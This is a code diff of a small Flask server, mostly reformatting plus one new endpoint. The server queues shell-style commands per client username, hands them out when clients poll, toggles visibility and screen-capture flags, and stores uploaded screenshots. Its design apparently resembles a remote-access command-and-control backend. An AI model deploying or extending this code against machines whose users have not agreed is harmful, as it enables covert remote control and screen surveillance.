@@ -78,14 +78,16 @@ def get_clients():
 
     conn.close()
 
-    return jsonify([
-        {
-            "username": row["username"],
-            "updated_at": row["updated_at"],
-            "visible": row["visible"] if row["visible"] is not None else 1
-        }
-        for row in rows
-    ])
+    return jsonify(
+        [
+            {
+                "username": row["username"],
+                "updated_at": row["updated_at"],
+                "visible": row["visible"] if row["visible"] is not None else 1,
+            }
+            for row in rows
+        ]
+    )
 
 
 @app.get("/api/frames/<username>")
@@ -98,10 +100,11 @@ def get_frames(username):
 
     files = sorted(
         [
-            f for f in os.listdir(user_dir)
+            f
+            for f in os.listdir(user_dir)
             if f.lower().endswith((".png", ".jpg", ".jpeg"))
         ],
-        key=lambda f: int("".join(filter(str.isdigit, f)) or "0")
+        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
     )
 
     return jsonify(files)
@@ -116,20 +119,15 @@ def set_visibility():
     visible = data.get("visible")
 
     if not username:
-        return jsonify({
-            "status": "error",
-            "message": "Missing username"
-        }), 400
+        return jsonify({"status": "error", "message": "Missing username"}), 400
 
     if visible is None:
-        return jsonify({
-            "status": "error",
-            "message": "Missing visible"
-        }), 400
+        return jsonify({"status": "error", "message": "Missing visible"}), 400
 
     conn = get_db()
 
-    conn.execute("""
+    conn.execute(
+        """
         INSERT INTO clients (
             username,
             visible,
@@ -140,7 +138,9 @@ def set_visibility():
         ON CONFLICT(username) DO UPDATE SET
             visible = excluded.visible,
             updated_at = datetime('now')
-    """, (username, visible))
+    """,
+        (username, visible),
+    )
 
     conn.commit()
     conn.close()
@@ -158,20 +158,15 @@ def set_command():
     visible = data.get("visible", 1)
 
     if not username:
-        return jsonify({
-            "status": "error",
-            "message": "Missing username"
-        }), 400
+        return jsonify({"status": "error", "message": "Missing username"}), 400
 
     if cmd is None:
-        return jsonify({
-            "status": "error",
-            "message": "Missing cmd"
-        }), 400
+        return jsonify({"status": "error", "message": "Missing cmd"}), 400
 
     conn = get_db()
 
-    conn.execute("""
+    conn.execute(
+        """
         INSERT INTO clients (
             username,
             cmd,
@@ -186,15 +181,14 @@ def set_command():
             run = 1,
             visible = excluded.visible,
             updated_at = datetime('now')
-    """, (username, cmd, visible))
+    """,
+        (username, cmd, visible),
+    )
 
     conn.commit()
     conn.close()
 
-    return jsonify({
-        "status": "success",
-        "message": "Command queued"
-    })
+    return jsonify({"status": "success", "message": "Command queued"})
 
 
 @app.get("/api/poll")
@@ -202,14 +196,12 @@ def poll_command():
     username = request.args.get("username")
 
     if not username:
-        return jsonify({
-            "status": "error",
-            "message": "Missing username"
-        }), 400
+        return jsonify({"status": "error", "message": "Missing username"}), 400
 
     conn = get_db()
 
-    conn.execute("""
+    conn.execute(
+        """
         INSERT INTO clients (
             username,
             updated_at
@@ -218,15 +210,20 @@ def poll_command():
 
         ON CONFLICT(username) DO UPDATE SET
             updated_at = datetime('now')
-    """, (username,))
+    """,
+        (username,),
+    )
 
     conn.commit()
 
-    row = conn.execute("""
+    row = conn.execute(
+        """
         SELECT cmd, run, visible, capture
         FROM clients
         WHERE username = ?
-    """, (username,)).fetchone()
+    """,
+        (username,),
+    ).fetchone()
 
     cmd_val = ""
     run_val = False
@@ -240,22 +237,70 @@ def poll_command():
         capture_val = bool(row["capture"])
 
         if run_val:
-            conn.execute("""
+            conn.execute(
+                """
                 UPDATE clients
                 SET run = 0
                 WHERE username = ?
-            """, (username,))
+            """,
+                (username,),
+            )
 
             conn.commit()
 
     conn.close()
 
-    return jsonify({
-        "cmd": cmd_val if run_val else "",
-        "run": run_val,
-        "visible": visible_val,
-        "capture": capture_val
-    })
+    return jsonify(
+        {
+            "cmd": cmd_val if run_val else "",
+            "run": run_val,
+            "visible": visible_val,
+            "capture": capture_val,
+        }
+    )
+
+
+@app.get("/api/poll_frames")
+def poll_frames():
+    username = request.args.get("username")
+
+    if not username:
+        return jsonify({"status": "error", "message": "Missing username"}), 400
+
+    conn = get_db()
+
+    conn.execute(
+        """
+        INSERT INTO clients (
+            username,
+            updated_at
+        )
+        VALUES (?, datetime('now'))
+
+        ON CONFLICT(username) DO UPDATE SET
+            updated_at = datetime('now')
+    """,
+        (username,),
+    )
+
+    conn.commit()
+
+    row = conn.execute(
+        """
+        SELECT capture
+        FROM clients
+        WHERE username = ?
+    """,
+        (username,),
+    ).fetchone()
+
+    capture_val = False
+    if row:
+        capture_val = bool(row["capture"])
+
+    conn.close()
+
+    return jsonify({"capture": capture_val})
 
 
 @app.post("/api/upload")
@@ -267,10 +312,7 @@ def upload_screenshot():
     image_base64 = data.get("image")
 
     if not username or not filename or not image_base64:
-        return jsonify({
-            "status": "error",
-            "message": "Missing fields"
-        }), 400
+        return jsonify({"status": "error", "message": "Missing fields"}), 400
 
     client_folder = os.path.join(SCREENSHOT_DIR, username)
     os.makedirs(client_folder, exist_ok=True)
@@ -286,15 +328,10 @@ def upload_screenshot():
         with open(file_path, "wb") as f:
             f.write(image_bytes)
 
-        return jsonify({
-            "status": "success"
-        })
+        return jsonify({"status": "success"})
 
     except Exception as e:
-        return jsonify({
-            "status": "error",
-            "message": str(e)
-        }), 500
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.get("/frames/<username>/<filename>")
@@ -306,8 +343,4 @@ def get_frame(username, filename):
 
 
 if __name__ == "__main__":
-    app.run(
-        host="0.0.0.0",
-        port=int(os.getenv("PORT", "5002")),
-        debug=False
-    )
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)
